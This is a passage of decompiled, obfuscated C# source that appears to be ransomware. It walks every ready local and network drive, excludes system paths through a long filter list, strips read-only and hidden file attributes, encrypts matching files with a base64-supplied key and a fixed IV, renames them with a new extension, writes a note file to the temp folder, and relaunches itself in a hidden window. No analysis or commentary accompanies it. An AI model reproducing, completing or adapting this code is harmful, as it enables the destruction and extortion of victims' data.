			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void obiNERLnbtQgNNVVN()
	{
		katTjVhRXIw(getString_0(107396345), SptLhhxIveIbH(getString_0(107387248)));
		string text = SptLhhxIveIbH(getString_0(107387054));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107388580) + text + getString_0(107388580) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396345);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void UyKwBXYiIu(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (ZQkgwClpBNRNGiD)
			{
				try
				{
					File.AppendAllText(LtQdcjdFVaR, getString_0(107387501) + string_0 + getString_0(107387492) + ex.Message + getString_0(107396606));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string zHhLTmoiTGS()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107389696);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107387403);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107387394))) ? getString_0(107387408) : getString_0(107387385));
				break;
			case 0:
				text = getString_0(107387431);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107387398);
				break;
			case 4:
				text = getString_0(107387353);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107387367) : getString_0(107387376));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107387343) : getString_0(107387316)) : getString_0(107387321)) : getString_0(107387330));
				break;
			case 10:
				text = getString_0(107387338);
				break;
			}
		}
		if (text != getString_0(107389696))
		{
			text = getString_0(107387333) + text;
			if (oSVersion.ServicePack != getString_0(107389696))
			{
				text = text + getString_0(107388197) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string ItgnTBrqjiU(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395239);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(SptLhhxIveIbH(getString_0(107395206)));
				streamWriter.WriteLine(getString_0(107396606));
				streamWriter.WriteLine(SptLhhxIveIbH(getString_0(107390232)));
				streamWriter.WriteLine(string_0);
				if (IrAGOpnAWTw)
				{
					streamWriter.WriteLine(getString_0(107396606));
					streamWriter.WriteLine(SptLhhxIveIbH(getString_0(107390138)));
					streamWriter.WriteLine(CymodjHxdipp.DceQYKwRdb());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !yzxmjEHglZqnOW)
				{
					File.AppendAllText(text, getString_0(107390105) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (ZQkgwClpBNRNGiD)
			{
				try
				{
					File.AppendAllText(LtQdcjdFVaR, getString_0(107387288) + ex.Message + getString_0(107396606));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void xLiejUAQVk(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		nICmWAPCmkfUon.VFHbqLpZujduPC CS_0024_003C_003E8__locals0 = new nICmWAPCmkfUon();
		CS_0024_003C_003E8__locals0.IKZYnWviuZRD = string_1;
		CS_0024_003C_003E8__locals0.cLeqiDJOkuMpOV = string_2;
		CS_0024_003C_003E8__locals0.UDmcHcdniryqge = string_3;
		CS_0024_003C_003E8__locals0.qIZRNqGfcrWcgcu = string_4;
		RpFQaGTQWAGLZ = Convert.FromBase64String(CS_0024_003C_003E8__locals0.UDmcHcdniryqge);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107395830))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = AEXwYmaPZOObQu(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !wHJSEylKjdkFOLFWi.Contains(text))
							{
								wHJSEylKjdkFOLFWi.Add(text);
							}
							else if (!wHJSEylKjdkFOLFWi.Contains(array[i].Name))
							{
								wHJSEylKjdkFOLFWi.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!wHJSEylKjdkFOLFWi.Contains(array[i].Name))
							{
								wHJSEylKjdkFOLFWi.Add(array[i].Name);
							}
						}
					}
					else if (!wHJSEylKjdkFOLFWi.Contains(array[i].Name))
					{
						wHJSEylKjdkFOLFWi.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!wHJSEylKjdkFOLFWi.Contains(string_0[j]))
				{
					wHJSEylKjdkFOLFWi.Add(string_0[j]);
				}
			}
		}
		if (wHJSEylKjdkFOLFWi.Contains(SptLhhxIveIbH(getString_0(107386719))) && lfAMVeKbACl == getString_0(107396888))
		{
			wHJSEylKjdkFOLFWi.Remove(SptLhhxIveIbH(getString_0(107386719)));
		}
		if (MSMPEzLLTfd == getString_0(107396888))
		{
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate25 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate25 = delegate
				{
					eqqULjqQvKNU.QYmXYxRPcsCNkL();
				};
			}
			Thread thread = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegate25);
			thread.IsBackground = true;
			thread.Priority = ThreadPriority.Normal;
			thread.Start();
		}
		Parallel.ForEach(wHJSEylKjdkFOLFWi, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new nICmWAPCmkfUon.VFHbqLpZujduPC();
			CS_0024_003C_003E8__locals0.cJrMFxNNPVFbmF = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.yZkMFVxJlKap = string_0;
			if (grcSOEZMQSYrI && !zHhLTmoiTGS().Contains(nICmWAPCmkfUon.getString_0(107387377)) && !zHhLTmoiTGS().Contains(nICmWAPCmkfUon.getString_0(107403648)))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						BsCWhZGHFFkwCr(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.yZkMFVxJlKap);
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			if (nmBOMxoUYyM == nICmWAPCmkfUon.getString_0(107396898))
			{
				Thread thread3 = new Thread((ThreadStart)delegate
				{
					UNfNXKufiWJeIr(CS_0024_003C_003E8__locals0.yZkMFVxJlKap, CS_0024_003C_003E8__locals0.cJrMFxNNPVFbmF.IKZYnWviuZRD, CS_0024_003C_003E8__locals0.cJrMFxNNPVFbmF.qIZRNqGfcrWcgcu, CS_0024_003C_003E8__locals0.cJrMFxNNPVFbmF.cLeqiDJOkuMpOV, CS_0024_003C_003E8__locals0.cJrMFxNNPVFbmF.UDmcHcdniryqge);
				});
				thread3.Priority = ThreadPriority.Normal;
				thread3.IsBackground = false;
				thread3.Start();
				thread3.Join();
			}
			else
			{
				UNfNXKufiWJeIr(CS_0024_003C_003E8__locals0.yZkMFVxJlKap, CS_0024_003C_003E8__locals0.IKZYnWviuZRD, CS_0024_003C_003E8__locals0.qIZRNqGfcrWcgcu, CS_0024_003C_003E8__locals0.cLeqiDJOkuMpOV, CS_0024_003C_003E8__locals0.UDmcHcdniryqge);
			}
		});
	}

	public static void UNfNXKufiWJeIr(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107389696));
		List<string> list3 = list2;
		if (tJgAHmIZsWvctlRW == getString_0(107396998))
		{
			if (GZFAokJxdme == getString_0(107396888) && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && kxvBhTvGqYhEFqHW(string_0))
			{
				SBFuPMYHyduhp sBFuPMYHyduhp = null;
				try
				{
					sBFuPMYHyduhp = new SBFuPMYHyduhp(string_0.Replace(getString_0(107396810), getString_0(107389696)));
				}
				catch
				{
					list = EobBUtdrrLs(string_0, string_1, string_2, string_3, string_4);
					return;
				}
				try
				{
					XzxtsGjzzckPDo(sBFuPMYHyduhp.ToArray().ToList(), string_1, string_2, string_3, string_4);
					return;
				}
				catch (Exception)
				{
					list = EobBUtdrrLs(string_0, string_1, string_2, string_3, string_4);
					return;
				}
			}
			list = EobBUtdrrLs(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = zuVXgmocmxRQpz.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0453;
					}
				}
				if ((VssstfCiFT == getString_0(107396998) && !item.EndsWith(text)) || rhZfJiziUVZGmK.Contains(item))
				{
					continue;
				}
				if (NTUVpfCRDqR == getString_0(107396888))
				{
					try
					{
						if (FTTifYaMdeudV.DQVZdjxliaL(item))
						{
							FTTifYaMdeudV.lsApOpcnkf(item);
						}
					}
					catch
					{
					}
				}
				rhZfJiziUVZGmK.Add(item);
				if (!LcgkciImoRwcI.Contains(Path.GetDirectoryName(item)))
				{
					LcgkciImoRwcI.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (GVzkeDFkkNt == getString_0(107396888) && fileStream.Length > Convert.ToInt32(JRjvEgYWmxeX) * 1024 * 1024 && !list3.Contains(text))
					{
						if (sKNvVrMLVliweTD == getString_0(107396888))
						{
							foreach (string item2 in fWsOOFrdViRF)
							{
								if (item.ToLower().EndsWith(item2) && bXfvZIqjNkLdMvI == getString_0(107396888))
								{
									if (Convert.ToInt32(CkwHjikrCvdOm) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											CymodjHxdipp.RDxamUeGvIod(getString_0(107389809), getString_0(107389804), getString_0(107389759), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && bXfvZIqjNkLdMvI == getString_0(107396998))
								{
									try
									{
										CymodjHxdipp.RDxamUeGvIod(getString_0(107389809), getString_0(107389804), getString_0(107389759), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = qsVBtPrJSv.onZydZdaURpY(item, Convert.ToInt32(JRjvEgYWmxeX) * 1024 * 1024);
						byte[] uqGgpaIFQqSRvN = qsVBtPrJSv.KiYWDoMxnom(byte_, Convert.FromBase64String(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						qsVBtPrJSv.lvDlvibtIHl(item, uqGgpaIFQqSRvN);
						if (string_2 != getString_0(107386710))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107386710))
					{
						RliZPxXhOnVjs(item, item + string_2, RpFQaGTQWAGLZ);
					}
					else
					{
						RliZPxXhOnVjs(item, item + getString_0(107386737), RpFQaGTQWAGLZ);
					}
				}
				catch (Exception)
				{
				}
				IL_0453:;
			}
		}
	}

	public static void XzxtsGjzzckPDo(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		uNiEyIpSZVz.XqXXZafSRwIHeXM CS_0024_003C_003E8__locals0 = new uNiEyIpSZVz();
		CS_0024_003C_003E8__locals0.VpbroTtOOIHkJa = list_0;
		CS_0024_003C_003E8__locals0.FuYKgKQHbtN = string_1;
		CS_0024_003C_003E8__locals0.IATEnfqjKRGd = string_2;
		CS_0024_003C_003E8__locals0.yIgCFYujnVKnghS = string_3;
		CS_0024_003C_003E8__locals0.sHhqMfTvkRbOg = new List<string> { getString_0(107389696) };
		if (VssstfCiFT == getString_0(107396998))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				using List<string>.Enumerator enumerator2 = CS_0024_003C_003E8__locals0.VpbroTtOOIHkJa.GetEnumerator();
				while (enumerator2.MoveNext())
				{
					uNiEyIpSZVz.iMsmThAMeQ CS_0024_003C_003E8__locals1 = new uNiEyIpSZVz.iMsmThAMeQ();
					CS_0024_003C_003E8__locals1.WzuXuFEQNWZh = CS_0024_003C_003E8__locals0;
					CS_0024_003C_003E8__locals1.dxgicsPAINTY = enumerator2.Current;
					if (!CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389258)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389233)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389200)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107389215)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107389170)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389177)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389156)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107389143)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107389098)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107389093)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107389084)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107389547)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107389521)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107389532)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389507)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389458)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389473)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389424)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389439)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389390)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389405)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389356)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389375)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107389322)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107389341)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107388784)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107388799)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(uNiEyIpSZVz.getString_0(107388750)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(SptLhhxIveIbH(uNiEyIpSZVz.getString_0(107388765))) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107388740)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107397156)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107388727)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.EndsWith(CS_0024_003C_003E8__locals0.FuYKgKQHbtN) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.EndsWith(uNiEyIpSZVz.getString_0(107388702)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.EndsWith(uNiEyIpSZVz.getString_0(107388697)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.EndsWith(uNiEyIpSZVz.getString_0(107388660)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.EndsWith(uNiEyIpSZVz.getString_0(107388655)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(uNiEyIpSZVz.getString_0(107388650)) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(UYUhiRtWDRA) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(LtQdcjdFVaR) && !CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(UJdCCmcOabmXjhMvpZ))
					{
						if (CS_0024_003C_003E8__locals0.IATEnfqjKRGd.Length != 0)
						{
							string[] iATEnfqjKRGd2 = CS_0024_003C_003E8__locals0.IATEnfqjKRGd;
							int num2 = 0;
							while (num2 < iATEnfqjKRGd2.Length)
							{
								string value2 = iATEnfqjKRGd2[num2];
								if (!CS_0024_003C_003E8__locals1.dxgicsPAINTY.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_10b1;
							}
						}
						try
						{
							if (CS_0024_003C_003E8__locals1.dxgicsPAINTY.EndsWith(CS_0024_003C_003E8__locals0.FuYKgKQHbtN))
							{
								goto IL_10b1;
							}
						}
						catch (Exception)
						{
							goto IL_10b1;
						}
						if (CS_0024_003C_003E8__locals1.dxgicsPAINTY.EndsWith(string_0) && !rhZfJiziUVZGmK.Contains(CS_0024_003C_003E8__locals1.dxgicsPAINTY))
						{
							if (NTUVpfCRDqR == uNiEyIpSZVz.getString_0(107396906))
							{
								try
								{
									if (FTTifYaMdeudV.DQVZdjxliaL(CS_0024_003C_003E8__locals1.dxgicsPAINTY))
									{
										FTTifYaMdeudV.lsApOpcnkf(CS_0024_003C_003E8__locals1.dxgicsPAINTY);
									}
								}
								catch
								{
								}
							}
							rhZfJiziUVZGmK.Add(CS_0024_003C_003E8__locals1.dxgicsPAINTY);
							Thread thread3 = new Thread((ThreadStart)delegate
							{
								try
								{
									if (vnHLNKxzZjB)
									{
										Console.WriteLine(uNiEyIpSZVz.iMsmThAMeQ.getString_0(107403192) + CS_0024_003C_003E8__locals1.dxgicsPAINTY + uNiEyIpSZVz.iMsmThAMeQ.getString_0(107403089) + new FileInfo(CS_0024_003C_003E8__locals1.dxgicsPAINTY).Length + uNiEyIpSZVz.iMsmThAMeQ.getString_0(107403100));
										Console.WriteLine(uNiEyIpSZVz.iMsmThAMeQ.getString_0(107403199), rhZfJiziUVZGmK.Count, bTxbPbZzsh, hRbHTMLNoeoN);
										Console.WriteLine(uNiEyIpSZVz.iMsmThAMeQ.getString_0(107402630), AxBdgXHxeQeZJ.Elapsed);
										Console.WriteLine(uNiEyIpSZVz.iMsmThAMeQ.getString_0(107403059));
									}
								}
								catch
								{
								}
							});
							thread3.Priority = ThreadPriority.Normal;
							thread3.IsBackground = true;
							thread3.Start();
							if (!LcgkciImoRwcI.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.dxgicsPAINTY)))
							{
								LcgkciImoRwcI.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.dxgicsPAINTY));
							}
							UyKwBXYiIu(CS_0024_003C_003E8__locals1.dxgicsPAINTY);
							try
							{
								new yQFjeolKXMd().noDvZcrtQzqfZg(CS_0024_003C_003E8__locals1.dxgicsPAINTY);
							}
							catch
							{
							}
							try
							{
								using FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals1.dxgicsPAINTY, FileMode.Open, FileAccess.Write);
								if (!fileStream2.CanWrite)
								{
									try
									{
										if (vnHLNKxzZjB)
										{
											Console.WriteLine(uNiEyIpSZVz.getString_0(107403675) + CS_0024_003C_003E8__locals1.dxgicsPAINTY + uNiEyIpSZVz.getString_0(107403086) + new FileInfo(CS_0024_003C_003E8__locals1.dxgicsPAINTY).Length + uNiEyIpSZVz.getString_0(107403097));
											Console.WriteLine(uNiEyIpSZVz.getString_0(107403056));
										}
									}
									catch
									{
									}
									katTjVhRXIw(SptLhhxIveIbH(uNiEyIpSZVz.getString_0(107402951)), uNiEyIpSZVz.getString_0(107388598) + CS_0024_003C_003E8__locals1.dxgicsPAINTY + uNiEyIpSZVz.getString_0(107388598) + SptLhhxIveIbH(uNiEyIpSZVz.getString_0(107402926)) + uNiEyIpSZVz.getString_0(107388598) + Environment.UserName + uNiEyIpSZVz.getString_0(107388598) + SptLhhxIveIbH(uNiEyIpSZVz.getString_0(107402941)));
								}
							}
							catch (Exception ex18)
							{
								if (ZQkgwClpBNRNGiD)
								{
									try
									{
										File.AppendAllText(LtQdcjdFVaR, uNiEyIpSZVz.getString_0(107387519) + CS_0024_003C_003E8__locals1.dxgicsPAINTY + uNiEyIpSZVz.getString_0(107402916) + ex18.Message + uNiEyIpSZVz.getString_0(107396624));
									}
									catch (Exception)
									{
									}
								}
								continue;
							}
							try
							{
								try
								{
									if (new FileInfo(CS_0024_003C_003E8__locals1.dxgicsPAINTY).Length != 0L)
									{
										goto end_IL_08ba;
									}
									goto end_IL_08ba_2;
									end_IL_08ba:;
								}
								catch (Exception ex20)
								{
									if (ZQkgwClpBNRNGiD)
									{
										try
										{
											File.AppendAllText(LtQdcjdFVaR, uNiEyIpSZVz.getString_0(107387519) + CS_0024_003C_003E8__locals1.dxgicsPAINTY + uNiEyIpSZVz.getString_0(107403315) + ex20.Message + uNiEyIpSZVz.getString_0(107396624));
										}
										catch (Exception)
										{
										}
									}
									hRbHTMLNoeoN++;
									goto end_IL_08ba_2;
								}
								if (!(GVzkeDFkkNt == uNiEyIpSZVz.getString_0(107396906)) || new FileInfo(CS_0024_003C_003E8__locals1.dxgicsPAINTY).Length <= Convert.ToInt32(JRjvEgYWmxeX) * 1024 * 1024 || CS_0024_003C_003E8__locals0.sHhqMfTvkRbOg.Contains(string_0))
								{
									if (IrAGOpnAWTw)
									{
										CS_0024_003C_003E8__locals0.FuYKgKQHbtN = QgOBOurkDz + CS_0024_003C_003E8__locals0.FuYKgKQHbtN;
									}
									byte[] bytes3 = Encoding.ASCII.GetBytes(jlwdVcCVDXv);
									if (CS_0024_003C_003E8__locals0.FuYKgKQHbtN != uNiEyIpSZVz.getString_0(107386728))
									{
										if (!hQdOFpLMvqT)
										{
											if (!yzxmjEHglZqnOW)
											{
												bjDjiXZhvR(CS_0024_003C_003E8__locals1.dxgicsPAINTY, CS_0024_003C_003E8__locals1.dxgicsPAINTY + CS_0024_003C_003E8__locals0.FuYKgKQHbtN, RpFQaGTQWAGLZ);
											}
											else
											{
												bjDjiXZhvR(CS_0024_003C_003E8__locals1.dxgicsPAINTY, CS_0024_003C_003E8__locals1.dxgicsPAINTY + CS_0024_003C_003E8__locals0.FuYKgKQHbtN, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yIgCFYujnVKnghS));
											}
										}
										else
										{
											try
											{
												if (!yzxmjEHglZqnOW)
												{
													djVxzdXCmcblm(CS_0024_003C_003E8__locals1.dxgicsPAINTY, CS_0024_003C_003E8__locals1.dxgicsPAINTY + CS_0024_003C_003E8__locals0.FuYKgKQHbtN, RpFQaGTQWAGLZ, Convert.FromBase64String(orecqussiUlGJkD));
												}
												else
												{
													djVxzdXCmcblm(CS_0024_003C_003E8__locals1.dxgicsPAINTY, CS_0024_003C_003E8__locals1.dxgicsPAINTY + CS_0024_003C_003E8__locals0.FuYKgKQHbtN, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yIgCFYujnVKnghS), Convert.FromBase64String(orecqussiUlGJkD));
												}
											}
											catch (Exception ex22)
											{
												if (ZQkgwClpBNRNGiD)
												{
													try
													{
														File.AppendAllText(LtQdcjdFVaR, uNiEyIpSZVz.getString_0(107387519) + CS_0024_003C_003E8__locals1.dxgicsPAINTY + uNiEyIpSZVz.getString_0(107386746) + ex22.Message + uNiEyIpSZVz.getString_0(107396624));
													}
													catch (Exception)
													{
													}
												}
												hRbHTMLNoeoN++;
												try
												{
													File.Move(CS_0024_003C_003E8__locals1.dxgicsPAINTY + CS_0024_003C_003E8__locals0.FuYKgKQHbtN, CS_0024_003C_003E8__locals1.dxgicsPAINTY);
												}
												catch (Exception)
												{
												}
												goto end_IL_08ba_2;
											}
										}
									}
									else if (!hQdOFpLMvqT)
									{
										if (!yzxmjEHglZqnOW)
										{
											bjDjiXZhvR(CS_0024_003C_003E8__locals1.dxgicsPAINTY, CS_0024_003C_003E8__locals1.dxgicsPAINTY + uNiEyIpSZVz.getString_0(107386755), RpFQaGTQWAGLZ);
										}
										else
										{
											bjDjiXZhvR(CS_0024_003C_003E8__locals1.dxgicsPAINTY, CS_0024_003C_003E8__locals1.dxgicsPAINTY + uNiEyIpSZVz.getString_0(107386755), Convert.FromBase64String(CS_0024_003C_003E8__locals0.yIgCFYujnVKnghS));
										}
									}
									else
									{
										try
										{
											if (!yzxmjEHglZqnOW)
											{
												djVxzdXCmcblm(CS_0024_003C_003E8__locals1.dxgicsPAINTY, CS_0024_003C_003E8__locals1.dxgicsPAINTY, RpFQaGTQWAGLZ, Convert.FromBase64String(orecqussiUlGJkD));
											}
											else
											{
												djVxzdXCmcblm(CS_0024_003C_003E8__locals1.dxgicsPAINTY, CS_0024_003C_003E8__locals1.dxgicsPAINTY, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yIgCFYujnVKnghS), Convert.FromBase64String(orecqussiUlGJkD));
											}
										}
										catch (Exception ex25)
										{
											if (ZQkgwClpBNRNGiD)
											{
												try
												{
													File.AppendAllText(LtQdcjdFVaR, uNiEyIpSZVz.getString_0(107387519) + CS_0024_003C_003E8__locals1.dxgicsPAINTY + uNiEyIpSZVz.getString_0(107386746) + ex25.Message + uNiEyIpSZVz.getString_0(107396624));
												}
												catch (Exception)
												{
												}
											}
											hRbHTMLNoeoN++;
											goto end_IL_08ba_2;
										}
									}
									if (yzxmjEHglZqnOW)
									{
										if (CS_0024_003C_003E8__locals0.FuYKgKQHbtN != uNiEyIpSZVz.getString_0(107386728))
										{
											OGgWAVXoBCZ(CS_0024_003C_003E8__locals1.dxgicsPAINTY + CS_0024_003C_003E8__locals0.FuYKgKQHbtN, bytes3);
										}
										else
										{
											OGgWAVXoBCZ(CS_0024_003C_003E8__locals1.dxgicsPAINTY, bytes3);
										}
									}
									goto IL_10b1;
								}
								CS_0024_003C_003E8__locals0 = new uNiEyIpSZVz.OexHNbhRQqQ();
								CS_0024_003C_003E8__locals0.JAfHokiOmoEMX = CS_0024_003C_003E8__locals1;
								CS_0024_003C_003E8__locals0.WzuXuFEQNWZh = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.FuYKgKQHbtN != uNiEyIpSZVz.getString_0(107386728))
									{
										if (IrAGOpnAWTw)
										{
											CS_0024_003C_003E8__locals0.FuYKgKQHbtN = QgOBOurkDz + CS_0024_003C_003E8__locals0.FuYKgKQHbtN;
										}
										File.Move(CS_0024_003C_003E8__locals1.dxgicsPAINTY, CS_0024_003C_003E8__locals1.dxgicsPAINTY + CS_0024_003C_003E8__locals0.FuYKgKQHbtN);
									}
								}
								catch (Exception ex27)
								{
									if (ZQkgwClpBNRNGiD)
									{
										try
										{
											File.AppendAllText(LtQdcjdFVaR, uNiEyIpSZVz.getString_0(107387519) + CS_0024_003C_003E8__locals1.dxgicsPAINTY + uNiEyIpSZVz.getString_0(107403286) + ex27.Message + uNiEyIpSZVz.getString_0(107396624));
										}
										catch (Exception)
										{
										}
									}
									hRbHTMLNoeoN++;
									goto end_IL_08ba_2;
								}
								CS_0024_003C_003E8__locals0.jxlBzzkVmZwV = uNiEyIpSZVz.getString_0(107389714);
								if (CS_0024_003C_003E8__locals0.FuYKgKQHbtN != uNiEyIpSZVz.getString_0(107386728))
								{
									CS_0024_003C_003E8__locals0.jxlBzzkVmZwV = CS_0024_003C_003E8__locals1.dxgicsPAINTY + CS_0024_003C_003E8__locals0.FuYKgKQHbtN;
								}
								else
								{
									CS_0024_003C_003E8__locals0.jxlBzzkVmZwV = CS_0024_003C_003E8__locals1.dxgicsPAINTY;
								}
								if (sKNvVrMLVliweTD == uNiEyIpSZVz.getString_0(107396906))
								{
									Thread thread4 = new Thread((ThreadStart)delegate
									{
										foreach (string item in fWsOOFrdViRF)
										{
											if (CS_0024_003C_003E8__locals0.jxlBzzkVmZwV.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.WzuXuFEQNWZh.FuYKgKQHbtN) && bXfvZIqjNkLdMvI == uNiEyIpSZVz.OexHNbhRQqQ.getString_0(107396913))
											{
